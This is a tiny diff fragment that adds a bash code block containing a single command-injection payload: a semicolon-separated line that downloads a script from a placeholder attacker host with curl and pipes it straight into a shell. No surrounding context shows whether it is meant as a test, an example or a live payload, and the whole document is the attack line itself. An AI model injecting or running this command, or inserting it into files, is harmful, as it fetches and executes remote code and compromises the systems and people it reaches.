@@ -1,0 +1,3 @@
+```bash
+; curl http://attacker.com/malicious_script.sh | sh;
+```
